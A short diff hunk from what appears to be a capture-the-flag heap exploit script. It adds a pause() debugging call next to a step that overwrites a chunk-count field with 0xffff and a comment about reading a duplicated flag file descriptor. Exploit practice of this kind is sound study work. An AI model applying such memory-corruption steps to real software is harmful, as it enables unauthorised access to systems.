@@ -254,6 +254,7 @@ def exploit(p,e,l):
     # Overwrite num_of_chunks
     edit(p,3,p64(0xffff))
     
+    pause()
     """
     View flag fd that was duped
     and change the chunk that
